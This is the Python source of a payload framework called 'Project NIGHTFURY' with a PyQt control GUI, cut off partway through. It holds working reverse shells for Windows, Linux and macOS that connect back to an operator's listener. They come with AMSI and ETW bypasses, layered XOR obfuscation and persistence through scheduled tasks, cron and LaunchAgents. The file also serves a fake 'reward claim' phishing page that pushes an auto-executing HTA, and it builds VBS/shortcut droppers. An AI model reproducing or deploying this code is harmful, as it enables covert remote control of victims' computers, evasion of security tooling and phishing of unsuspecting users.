#!/usr/bin/env python3
"""
Project NIGHTFURY - Advanced Auto-Execute Payload System
Author: Cyber Sentinel
Version: 5.0 - OWASP Enhanced Edition
Description: Advanced payload framework with multi-platform support and enhanced evasion
"""

import os
import sys
import base64
import random
import string
import socket
import threading
import time
import requests
import json
import discord
from discord.ext import commands
import asyncio
import subprocess
import uuid
import re
import logging
import qrcode
import io
import platform
import sqlite3
import datetime
import tempfile
import zipfile
import shutil
from cryptography.fernet import Fernet
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QCheckBox, QGroupBox,
    QComboBox, QListWidget, QListWidgetItem, QProgressBar, QMessageBox,
    QFileDialog, QSplitter, QFormLayout, QSizePolicy, QStatusBar, QStackedWidget,
    QTreeWidget, QTreeWidgetItem, QTableWidget, QTableWidgetItem, QHeaderView,
    QDockWidget, QMenu, QAction, QSystemTrayIcon, QToolBar, QToolButton, QDialog,
    QInputDialog, QListView, QStyledItemDelegate, QStyle, QSpinBox, QDoubleSpinBox,
    QSlider, QProgressDialog, QDialogButtonBox, QFrame, QGridLayout
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QSize, QPoint, QRect, QUrl
from PyQt5.QtGui import (QFont, QPalette, QColor, QIcon, QPixmap, QImage, QDesktopServices, 
                         QPainter, QLinearGradient, QBrush, QPen, QPainterPath, QMouseEvent)
from PyQt5.QtChart import QChart, QChartView, QPieSeries, QBarSet, QBarSeries, QValueAxis, QBarCategoryAxis

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nightfury.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("NIGHTFURY")

# ==============================
# PLUGIN SYSTEM
# ==============================

class Plugin:
    """Base class for all plugins"""
    def __init__(self, core):
        self.core = core
        self.name = "Unnamed Plugin"
        self.version = "1.0"
        self.description = "No description"
        
    def initialize(self):
        """Initialize the plugin"""
        pass
        
    def execute(self, *args, **kwargs):
        """Execute plugin functionality"""
        pass

class PluginManager:
    """Manages plugin loading and execution"""
    def __init__(self):
        self.plugins = {}
        self.loaded_plugins = {}
        
    def register_plugin(self, name, plugin_class):
        """Register a plugin class"""
        self.plugins[name] = plugin_class
        
    def load_plugin(self, name, core):
        """Load a plugin instance"""
        if name in self.plugins:
            plugin = self.plugins[name](core)
            plugin.initialize()
            self.loaded_plugins[name] = plugin
            return plugin
        return None
        
    def get_plugin(self, name):
        """Get a loaded plugin"""
        return self.loaded_plugins.get(name)
        
    def list_plugins(self):
        """List all available plugins"""
        return list(self.plugins.keys())

# ==============================
# CORE PAYLOAD GENERATION ENGINE
# ==============================

class NightfuryPayload:
    def __init__(self, lhost, lport, obfuscation_level=5, persistence=True, 
                 evasion_techniques=True, platform="windows", payload_type="reverse_shell"):
        self.lhost = lhost
        self.lport = lport
        self.obfuscation_level = obfuscation_level
        self.persistence = persistence
        self.evasion_techniques = evasion_techniques
        self.platform = platform
        self.payload_type = payload_type
        self.payload = None
        self.payload_id = str(uuid.uuid4())[:8]
        self.encryption_key = Fernet.generate_key()
        self.fernet = Fernet(self.encryption_key)
    
    def _generate_key(self, length=32):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    def _xor_encrypt(self, payload):
        key = self._generate_key()
        encrypted = bytearray()
        for i in range(len(payload)):
            encrypted.append(payload[i] ^ ord(key[i % len(key)]))
        return base64.b64encode(encrypted).decode(), key
    
    def _aes_encrypt(self, payload):
        encrypted = self.fernet.encrypt(payload)
        return base64.b64encode(encrypted).decode()
    
    def _add_amsi_bypass(self, payload):
        bypass_code = '''
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
        [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').SetValue($null, @{});
        '''
        return bypass_code + payload
    
    def _add_etw_bypass(self, payload):
        etw_bypass = '''
        $etwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');
        $etwProvider.GetField('etwProvider','NonPublic,Static').SetValue($null, $null);
        '''
        return etw_bypass + payload
    
    def _add_sleep_obfuscation(self, payload):
        sleep_obfuscation = '''
        function Invoke-SleepObfuscation {
            param($Seconds)
            $start = Get-Date
            while ((Get-Date) - $start).TotalSeconds -lt $Seconds) {
                $dummy = 1..1000 | ForEach-Object { [math]::Sin($_) }
            }
        }
        '''
        return sleep_obfuscation + payload.replace('Start-Sleep', 'Invoke-SleepObfuscation')
    
    def _add_api_unhooking(self, payload):
        api_unhooking = '''
        function Invoke-APIUnhooking {
            $kernel32 = Add-Type -Name 'Kernel32' -Namespace 'Win32' -MemberDefinition '
                [DllImport("kernel32.dll")]
                public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
                
                [DllImport("kernel32.dll")]
                public static extern IntPtr LoadLibrary(string lpFileName);
                
                [DllImport("kernel32.dll")]
                public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
            ' -PassThru
            
            # TODO: Implement actual API unhooking logic
            Write-Host "API Unhooking placeholder"
        }
        Invoke-APIUnhooking
        '''
        return api_unhooking + payload
    
    def _add_persistence(self, payload):
        if self.platform == "windows":
            persistence_code = f'''
            $taskName = "SystemHealthCheck_{self.payload_id}";
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"{payload}`"";
            $trigger = New-ScheduledTaskTrigger -AtLogOn;
            $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\\$env:USERNAME" -LogonType Interactive;
            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew;
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null;
            '''
        elif self.platform == "linux":
            persistence_code = f'''
            echo '{payload}' > /etc/cron.hourly/system-health-check
            chmod +x /etc/cron.hourly/system-health-check
            '''
        else:  # macOS
            persistence_code = f'''
            echo '{payload}' > ~/Library/LaunchAgents/com.system.healthcheck.plist
            launchctl load ~/Library/LaunchAgents/com.system.healthcheck.plist
            '''
        
        return persistence_code
    
    def _obfuscate_vars(self, payload):
        # Replace common variable names with random strings
        var_map = {
            'c': self._generate_key(6),
            's': self._generate_key(6),
            'b': self._generate_key(6),
            'i': self._generate_key(6),
            'd': self._generate_key(6),
            'sb': self._generate_key(6),
            'sb2': self._generate_key(6),
            'bt': self._generate_key(6)
        }
        
        for orig, new in var_map.items():
            payload = payload.replace(f'${orig}', f'${new}')
        
        return payload
    
    def _insert_junk_code(self, payload):
        # Insert random comments and junk operations
        junk_ops = [
            "Start-Sleep -Milliseconds 10;",
            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;",
            "$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');",
            "$junkVar = [System.Guid]::NewGuid().ToString();",
            "if ($true) { $null = 1 + 1 };",
            "for ($i=0; $i -lt 1; $i++) { $null = $i };",
            "try { $null = Get-Date } catch {};"
        ]
        
        lines = payload.split(';')
        new_lines = []
        for line in lines:
            if line.strip() and random.random() > 0.7:
                junk = random.choice(junk_ops)
                new_lines.append(junk)
            new_lines.append(line)
        
        return ';'.join(new_lines)
    
    def _generate_windows_payload(self):
        # Base PowerShell reverse shell with enhanced obfuscation
        ps_code = f'''
        $c = New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});
        $s = $c.GetStream();
        [byte[]]$b = 0..65535|%{{0}};
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
            $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
            $sb = (iex $d 2>&1 | Out-String );
            $sb2 = $sb + "PS " + (pwd).Path + "> ";
            $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
            $s.Write($sbt,0,$sbt.Length);
            $s.Flush()
        }}
        $c.Close()
        '''
        
        # Add evasion techniques
        if self.evasion_techniques:
            ps_code = self._add_amsi_bypass(ps_code)
            ps_code = self._add_etw_bypass(ps_code)
            ps_code = self._add_sleep_obfuscation(ps_code)
            ps_code = self._add_api_unhooking(ps_code)
        
        # Apply obfuscation layers
        for _ in range(self.obfuscation_level):
            encrypted, key = self._xor_encrypt(ps_code.encode())
            ps_code = f'''
            $k = "{key}";
            $s = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{encrypted}"));
            $r = '';
            0..($s.Length-1)|%{{$r += [char]($s[$_] -bxor $k[$_ % $k.Length])}};
            iex $r
            '''
            # Randomize variable names
            ps_code = self._obfuscate_vars(ps_code)
            # Insert junk code
            ps_code = self._insert_junk_code(ps_code)
        
        # Add persistence if requested
        if self.persistence:
            ps_code = self._add_persistence(ps_code)
        
        return ps_code
    
    def _generate_linux_payload(self):
        # Linux bash reverse shell
        bash_code = f'''#!/bin/bash
        while true; do
            bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1 2>/dev/null
            sleep 30
        done
        '''
        
        # Add persistence if requested
        if self.persistence:
            bash_code += f'''
            # Add to crontab for persistence
            (crontab -l 2>/dev/null; echo "@reboot sleep 60 && {bash_code}") | crontab -
            '''
        
        return bash_code
    
    def _generate_macos_payload(self):
        # macOS reverse shell (bash or python)
        macos_code = f'''#!/bin/bash
        # Check if we have python
        if command -v python3 &> /dev/null; then
            python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{self.lhost}',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
        else
            bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
        fi
        '''
        
        # Add persistence if requested
        if self.persistence:
            macos_code += f'''
            # Create launch agent for persistence
            cat > ~/Library/LaunchAgents/com.system.update.plist << EOF
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
            <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.system.update</string>
                <key>ProgramArguments</key>
                <array>
                    <string>/bin/bash</string>
                    <string>-c</string>
                    <string>{macos_code}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
                <key>KeepAlive</key>
                <true/>
            </dict>
            </plist>
            EOF
            launchctl load ~/Library/LaunchAgents/com.system.update.plist
            '''
        
        return macos_code
    
    def generate(self):
        # Generate platform-specific payload
        if self.platform == "windows":
            ps_code = self._generate_windows_payload()
            self.payload = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"{ps_code}\""
        elif self.platform == "linux":
            self.payload = self._generate_linux_payload()
        elif self.platform == "macos":
            self.payload = self._generate_macos_payload()
        else:
            raise ValueError(f"Unsupported platform: {self.platform}")
        
        return self.payload
    
    def generate_hta(self):
        if not self.payload:
            self.generate()
        
        # Create HTA file that auto-executes the payload
        hta_content = f"""
        <html>
        <head>
        <title>Reward Claim Center</title>
        <HTA:APPLICATION ID="RewardClaim" APPLICATIONNAME="Reward Claim" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
        <script language="VBScript">
            Sub Window_OnLoad
                On Error Resume Next
                Set objShell = CreateObject("Wscript.Shell")
                objShell.Run "{self.payload.replace('"', '""')}", 0, False
                Self.Close
            End Sub
        </script>
        </head>
        <body>
        <div style="font-family: Arial; text-align: center; padding: 50px;">
            <h1>Processing Your Reward...</h1>
            <p>Please wait while we verify and apply your bonus.</p>
        </div>
        </body>
        </html>
        """
        return hta_content
    
    def generate_lnk(self, output_path):
        """Generate a LNK file that executes the payload"""
        if not self.payload:
            self.generate()
        
        # Create a VBS script that will be called by the LNK file
        vbs_content = f'''
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.Run "{self.payload}", 0, False
        Set WshShell = Nothing
        '''
        
        vbs_path = os.path.join(tempfile.gettempdir(), f"system_update_{random.randint(1000, 9999)}.vbs")
        with open(vbs_path, 'w') as f:
            f.write(vbs_content)
        
        # Create LNK file
        lnk_content = f'''
        [InternetShortcut]
        URL=file:///{vbs_path.replace(os.sep, '/')}
        IconIndex=0
        HotKey=0
        IconFile=C:\\Windows\\System32\\shell32.dll
        '''
        
        with open(output_path, 'w') as f:
            f.write(lnk_content)
        
        return output_path

# ========================
# AUTO-EXECUTION ENGINES
# ========================

class AutoExecutionServer(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query = parse_qs(parsed_path.query)
        
        # Check for trigger parameter
        if parsed_path.path == "/claim":
            # Send auto-execute HTA file
            self.send_response(200)
            self.send_header('Content-Type', 'application/hta')
            self.send_header('Content-Disposition', 'attachment; filename="reward_claim.hta"')
            self.end_headers()
            
            # Generate HTA payload
            payload = NightfuryPayload(
                self.server.lhost, 
                self.server.lport,
                self.server.obfuscation_level,
                self.server.persistence,
                self.server.evasion_techniques,
                self.server.platform
            )
            hta_content = payload.generate_hta()
            self.wfile.write(hta_content.encode())
            logger.info(f"Served payload to {self.client_address[0]}")
            return
        
        # Serve a decoy page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Generate a random claim token
        claim_token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        claim_url = f"http://{self.server.domain}/claim?token={claim_token}"
        
        # Create QR code
        qr = qrcode.QRCode()
        qr.add_data(claim_url)
        qr_img = qr.make_image(fill_color="black", back_color="white")
        img_byte_arr = io.BytesIO()
        qr_img.save(img_byte_arr, format='PNG')
        img_base64 = base64.b64encode(img_byte_arr.getvalue()).decode()
        
        # Serve decoy page with QR code
        html_content = f"""
        <html>
        <head>
            <title>Exclusive Reward Claim</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c); 
                        color: white; text-align: center; padding: 20px; }}
                .container {{ max-width: 800px; margin: 0 auto; background: rgba(0, 0, 0, 0.7); 
                            padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }}
                h1 {{ color: #ffcc00; }}
                .qr-container {{ margin: 20px auto; padding: 15px; background: white; 
                                border-radius: 10px; display: inline-block; }}
                .button {{ background: #ffcc00; color: #1a2a6c; padding: 15px 30px; 
                         font-size: 18px; border: none; border-radius: 50px; 
                         cursor: pointer; font-weight: bold; margin: 20px; 
                         box-shadow: 0 4px 8px rgba(0,0,0,0.3); }}
                .button:hover {{ background: #ffdd33; }}
                .instructions {{ background: rgba(255, 255, 255, 0.1); padding: 15px; 
                              border-radius: 10px; margin: 20px 0; text-align: left; }}
            </style>
            <script>
                function startClaim() {{
                    // Create iframe to trigger download without leaving page
                    var iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = '/claim?token={claim_token}';
                    document.body.appendChild(iframe);
                    
                    // Show processing message
                    document.getElementById('processing').style.display = 'block';
                    document.getElementById('claim-button').style.display = 'none';
                    
                    // Show manual download link after delay
                    setTimeout(function() {{
                        document.getElementById('manual-download').style.display = 'block';
                    }}, 5000);
                }}
                
                function downloadLNK() {{
                    window.location.href = '/download_lnk?token={claim_token}';
                }}
            </script>
        </head>
        <body>
            <div class="container">
                <h1>🎁 Exclusive Reward Claim Center 🎁</h1>
                <p>Congratulations! You've been selected to receive a special bonus.</p>
                
                <div class="qr-container">
                    <img src="data:image/png;base64,{img_base64}" alt="Claim QR Code" width="200">
                </div>
                
                <p>Scan the QR code with your mobile device or click the button below to claim your reward:</p>
                
                <button id="claim-button" class="button" onclick="startClaim()">CLAIM YOUR REWARD NOW</button>
                
                <button id="lnk-button" class="button" onclick="downloadLNK()" style="background: #4CAF50;">
                    DOWNLOAD AS SHORTCUT
                </button>
                
                <div id="processing" style="display: none;">
                    <h2>Processing Your Claim...</h2>
                    <p>Your reward is being prepared. This may take a few moments.</p>
                    <div style="margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; 
                                border-top: 5px solid #ffcc00; border-radius: 50%; animation: spin 2s linear infinite;"></div>
                    <style>@keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}</style>
                </div>
                
                <div id="manual-download" style="display: none; margin-top: 30px;">
                    <div class="instructions">
                        <h3>Manual Claim Instructions</h3>
                        <p>If your reward didn't start automatically:</p>
                        <ol>
                            <li>Click the download link below</li>
                            <li>Open the downloaded file</li>
                            <li>Click "Run" if prompted by Windows security</li>
                        </ol>
                        <p><a href="/claim?token={claim_token}" style="color: #ffcc00; font-weight: bold;">Download Reward Claim Assistant</a></p>
                    </div>
                </div>
                
                <div style="margin-top: 30px; font-size: 14px; opacity: 0.8;">
                    <p>This is a secure system provided by your organization.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        self.wfile.write(html_content.encode())
        logger.info(f"Served decoy page to {self.client_address[0]}")
    
    def do_POST(self):
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == "/submit_form":
            # Process form submission (phishing)
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            form_data = parse_qs(post_data)
            
            # Log form submission
            logger.info(f"Form submission from {self.client_address[0]}: {form_data}")
            
            # Redirect to claim page
            self.send_response(302)
            self.send_header('Location', '/claim')
            self.end_headers()
            return

# =====================
# ENHANCED GUI APPLICATION
# =====================

class ModernButton(QPushButton):
    """Modern styled button with hover effects"""
    def __init__(self, text, parent=None):
        super().__init__(text, parent)
        self.setCursor(Qt.PointingHandCursor)
        self.setMinimumHeight(35)
        
    def enterEvent(self, event):
        self.setStyleSheet("""
            QPushButton {
                background-color: #5a9cff;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 8px 16px;
                font-weight: bold;
            }
        """)
        super().enterEvent(event)
        
    def leaveEvent(self, event):
        self.setStyleSheet("""
            QPushButton {
                background-color: #3d8eff;
                color: white;
                border: none;
                border-radius: 5px;
                padding: 8px 16px;
                font-weight: bold;
            }
        """)
        super().leaveEvent(event)

class AnimatedProgressBar(QProgressBar):
    """Progress bar with animation"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.animation = QPropertyAnimation(self, b"value")
        self.animation.setDuration(1000)
        
    def setValueAnimated(self, value):
        self.animation.setStartValue(self.value())
        self.animation.setEndValue(value)
        self.animation.start()

class ConnectionGraph(QWidget):
    """Real-time connection graph widget"""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.data = []
        self.max_points = 50
        self.setMinimumHeight(150)
        
    def add_data_point(self, value):
        self.data.append(value)
        if len(self.data) > self.max_points:
            self.data.pop(0)
        self.update()
        
    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        
        # Draw background
        painter.fillRect(self.rect(), QColor(40, 44, 52))
        
        if not self.data:
            return
            
        # Draw grid
        painter.setPen(QPen(QColor(70, 74, 82), 1, Qt.DotLine))
        for i in range(5):
            y = self.height() - (i * self.height() / 4)
            painter.drawLine(0, y, self.width(), y)
            
        # Draw data line
        max_value = max(self.data) if max(self.data) > 0 else 1
        path = QPainterPath()
        
        for i, value in enumerate(self.data):
            x = i * self.width() / (len(self.data) - 1) if len(self.data) > 1 else 0
            y = self.height() - (value / max_value * self.height())
            
            if i == 0:
                path.moveTo(x, y)
            else:
                path.lineTo(x, y)
                
        # Draw gradient under the line
        gradient_path = QPainterPath(path)
        gradient_path.lineTo(self.width(), self.height())
        gradient_path.lineTo(0, self.height())
        gradient_path.closeSubpath()
        
        gradient = QLinearGradient(0, 0, 0, self.height())
        gradient.setColorAt(0, QColor(61, 142, 255, 100))
        gradient.setColorAt(1, QColor(61, 142, 255, 20))
        
        painter.fillPath(gradient_path, gradient)
        
        # Draw the line
        painter.setPen(QPen(QColor(61, 142, 255), 2))
        painter.drawPath(path)
        
        # Draw points
        painter.setPen(Qt.NoPen)
        painter.setBrush(QColor(61, 142, 255))
        
        for i, value in enumerate(self.data):
            x = i * self.width() / (len(self.data) - 1) if len(self.data) > 1 else 0
            y = self.height() - (value / max_value * self.height())
            painter.drawEllipse(QPoint(x, y), 3, 3)

class NightfuryGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Project NIGHTFURY v5.0 - OWASP Enhanced")
        self.setGeometry(100, 100, 1400, 900)
        
        # Initialize configuration
        self.config = {
            'lhost': self.get_public_ip(),
            'lport': 4444,
            'obfuscation_level': 5,
            'persistence': True,
            'evasion_techniques': True,
            'platform': "windows",
            'payload_type': "reverse_shell",
            'discord_token': "",
            'auto_server_port': 8080,
            'domain': "reward-center.org",
            'auto_start_server': False,
            'auto_start_bot': False
        }
        self.current_payload = None
        self.listener_thread = None
        self.http_server = None
        self.discord_bot = None
        self.active_connections = []
        self.connection_stats = []
        self.plugin_manager = PluginManager()
        
        # Create main tabs
        self.tabs = QTabWidget()
        self.tabs.setTabPosition(QTabWidget.West)
        self.tabs.setDocumentMode(True)
        self.setCentralWidget(self.tabs)
        
        # Create tabs
        self.create_dashboard_tab()
        self.create_config_tab()
        self.create_payload_tab()
        self.create_listener_tab()
        self.create_auto_execute_tab()
        self.create_plugins_tab()
        
        # Create status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("✅ System Ready")
        
        # Create toolbar
        self.create_toolbar()
        
        # Apply dark theme
        self.apply_dark_theme()
        
        # Show banner
        self.show_banner()
        
        # Setup connection monitor
        self.connection_monitor = QTimer()
        self.connection_monitor.timeout.connect(self.update_connection_status)
        self.connection_monitor.start(1000)  # Check every second
        
        # Setup stats monitor
        self.stats_monitor = QTimer()
        self.stats_monitor.timeout.connect(self.update_stats)
        self.stats_monitor.start(5000)  # Update stats every 5 seconds
        
        # Load plugins
        self.load_plugins()
        
        # Setup system tray
        self.setup_system_tray()
    
    def create_toolbar(self):
        toolbar = QToolBar("Main Toolbar")
        toolbar.setIconSize(QSize(24, 24))
        self.addToolBar(toolbar)
        
        # Add actions
        start_action = QAction(QIcon.fromTheme("media-playback-start"), "Start Listener", self)
        start_action.triggered.connect(self.start_listener)
        toolbar.addAction(start_action)
        
        stop_action = QAction(QIcon.fromTheme("media-playback-stop"), "Stop Listener", self)
        stop_action.triggered.connect(self.stop_listener)
        toolbar.addAction(stop_action)
        
        toolbar.addSeparator()
        
        generate_action = QAction(QIcon.fromTheme("document-new"), "Generate Payload", self)
        generate_action.triggered.connect(self.generate_payload)
        toolbar.addAction(generate_action)
        
        save_action = QAction(QIcon.fromTheme("document-save"), "Save Payload", self)
        save_action.triggered.connect(self.save_payload)
        toolbar.addAction(save_action)
        
        toolbar.addSeparator()
        
        settings_action = QAction(QIcon.fromTheme("preferences-system"), "Settings", self)
        settings_action.triggered.connect(self.show_settings)
        toolbar.addAction(settings_action)
    
    def create_dashboard_tab(self):
        dashboard_tab = QWidget()
        layout = QVBoxLayout()
        dashboard_tab.setLayout(layout)
        self.tabs.addTab(dashboard_tab, "🏠 Dashboard")
        
        # Stats overview
        stats_group = QGroupBox("Overview")
        stats_layout = QHBoxLayout()
        
        # Connection stats
        conn_widget = QWidget()
        conn_layout = QVBoxLayout()
        self.conn_count = QLabel("0")
        self.conn_count.setAlignment(Qt.AlignCenter)
        self.conn_count.setStyleSheet("font-size: 24px; font-weight: bold; color: #61aeee;")
        conn_layout.addWidget(self.conn_count)
        conn_layout.addWidget(QLabel("Active Connections"))
        conn_widget.setLayout(conn_layout)
        stats_layout.addWidget(conn_widget)
        
        # Server stats
        server_widget = QWidget()
        server_layout = QVBoxLayout()
        self.server_status = QLabel("Stopped")
        self.server_status.setAlignment(Qt.AlignCenter)
        self.server_status.setStyleSheet("font-size: 24px; font-weight: bold; color: #e06c75;")
        server_layout.addWidget(self.server_status)
        server_layout.addWidget(QLabel("Auto-Server Status"))
        server_widget.setLayout(server_layout)
        stats_layout.addWidget(server_widget)
        
        # Bot stats
        bot_widget = QWidget()
        bot_layout = QVBoxLayout()
        self.bot_status_dash = QLabel("Stopped")
        self.bot_status_dash.setAlignment(Qt.AlignCenter)
        self.bot_status_dash.setStyleSheet("font-size: 24px; font-weight: bold; color: #e06c75;")
        bot_layout.addWidget(self.bot_status_dash)
        bot_layout.addWidget(QLabel("Discord Bot Status"))
        bot_widget.setLayout(bot_layout)
        stats_layout.addWidget(bot_widget)
        
        # Payload stats
        payload_widget = QWidget()
        payload_layout = QVBoxLayout()
        self.payload_count = QLabel("0")
        self.payload_count.setAlignment(Qt.AlignCenter)
        self.payload_count.setStyleSheet("font-size: 24px; font-weight: bold; color: #98c379;")
        payload_layout.addWidget(self.payload_count)
        payload_layout.addWidget(QLabel("Payloads Generated"))
        payload_widget.setLayout(payload_layout)
        stats_layout.addWidget(payload_widget)
        
        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)
        
        # Connection graph
        graph_group = QGroupBox("Connection Activity")
        graph_layout = QVBoxLayout()
        self.connection_graph = ConnectionGraph()
        graph_layout.addWidget(self.connection_graph)
        graph_group.setLayout(graph_layout)
        layout.addWidget(graph_group)
        
        # Recent activity
        activity_group = QGroupBox("Recent Activity")
        activity_layout = QVBoxLayout()
        self.activity_list = QListWidget()
        activity_layout.addWidget(self.activity_list)
        activity_group.setLayout(activity_layout)
        layout.addWidget(activity_group)
    
    def create_config_tab(self):
        config_tab = QWidget()
        layout = QVBoxLayout()
        config_tab.setLayout(layout)
        self.tabs.addTab(config_tab, "⚙️ Configuration")
        
        # Network settings group
        network_group = QGroupBox("Network Settings")
        network_layout = QFormLayout()
        
        self.lhost_input = QLineEdit(self.config['lhost'])
        self.lhost_input.setPlaceholderText("Listener IP")
        network_layout.addRow("LHOST (Listener IP):", self.lhost_input)
        
        self.lport_input = QLineEdit(str(self.config['lport']))
        self.lport_input.setPlaceholderText("Listener Port")
        network_layout.addRow("LPORT (Listener Port):", self.lport_input)
        
        self.server_port_input = QLineEdit(str(self.config['auto_server_port']))
        self.server_port_input.setPlaceholderText("Auto-Execute Server Port")
        network_layout.addRow("Server Port:", self.server_port_input)
        
        self.domain_input = QLineEdit(self.config['domain'])
        self.domain_input.setPlaceholderText("Obfuscation Domain")
        network_layout.addRow("Obfuscation Domain:", self.domain_input)
        
        network_group.setLayout(network_layout)
        layout.addWidget(network_group)
        
        # Payload settings group
        payload_group = QGroupBox("Payload Settings")
        payload_layout = QFormLayout()
        
        self.platform_combo = QComboBox()
        self.platform_combo.addItems(["Windows", "Linux", "macOS"])
        self.platform_combo.setCurrentText(self.config['platform'].capitalize())
        payload_layout.addRow("Target Platform:", self.platform_combo)
        
        self.payload_type_combo = QComboBox()
        self.payload_type_combo.addItems(["Reverse Shell", "Meterpreter", "Bind Shell", "Web Shell"])
        payload_layout.addRow("Payload Type:", self.payload_type_combo)
        
        self.obf_level = QComboBox()
        self.obf_level.addItems(["1 (Low)", "2", "3", "4 (Recommended)", "5 (Maximum)"])
        self.obf_level.setCurrentIndex(3)
        payload_layout.addRow("Obfuscation Level:", self.obf_level)
        
        self.persistence_cb = QCheckBox("Enable persistence (survives reboot)")
        self.persistence_cb.setChecked(True)
        payload_layout.addRow(self.persistence_cb)
        
        self.evasion_cb = QCheckBox("Enable advanced evasion techniques")
        self.evasion_cb.setChecked(True)
        payload_layout.addRow(self.evasion_cb)
        
        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)
        
        # API settings group
        api_group = QGroupBox("Discord Integration")
        api_layout = QFormLayout()
        
        self.discord_token_input = QLineEdit()
        self.discord_token_input.setPlaceholderText("Discord Bot Token")
        self.discord_token_input.setEchoMode(QLineEdit.PasswordEchoOnEdit)
        api_layout.addRow("Discord Token:", self.discord_token_input)
        
        api_group.setLayout(api_layout)
        layout.addWidget(api_group)
        
        # Auto-start settings
        auto_group = QGroupBox("Auto-Start Settings")
        auto_layout = QVBoxLayout()
        
        self.auto_server_cb = QCheckBox("Start auto-execution server on application launch")
        auto_layout.addWidget(self.auto_server_cb)
        
        self.auto_bot_cb = QCheckBox("Start Discord bot on application launch")
        auto_layout.addWidget(self.auto_bot_cb)
        
        auto_group.setLayout(auto_layout)
        layout.addWidget(auto_group)
        
        # Save button
        save_btn = ModernButton("Save Configuration")
        save_btn.clicked.connect(self.save_config)
        save_btn.setFixedHeight(40)
        layout.addWidget(save_btn)
    
    def create_payload_tab(self):
        payload_tab = QWidget()
        layout = QVBoxLayout()
        payload_tab.setLayout(layout)
        self.tabs.addTab(payload_tab, "🔧 Payload")
        
        # Payload generation options
        options_group = QGroupBox("Generation Options")
        options_layout = QHBoxLayout()
        
        self.gen_ps_btn = ModernButton("Generate PowerShell")
        self.gen_ps_btn.clicked.connect(lambda: self.generate_payload("windows"))
        options_layout.addWidget(self.gen_ps_btn)
        
        self.gen_hta_btn = ModernButton("Generate HTA")
        self.gen_hta_btn.clicked.connect(self.generate_hta)
        options_layout.addWidget(self.gen_hta_btn)
        
        self.gen_lnk_btn = ModernButton("Generate LNK")
        self.gen_lnk_btn.clicked.connect(self.generate_lnk)
        options_layout.addWidget(self.gen_lnk_btn)
        
        self.gen_bash_btn = ModernButton("Generate Bash")
        self.gen_bash_btn.clicked.connect(lambda: self.generate_payload("linux"))
        options_layout.addWidget(self.gen_bash_btn)
        
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)
        
        # Payload preview
        payload_preview_group = QGroupBox("Payload Preview")
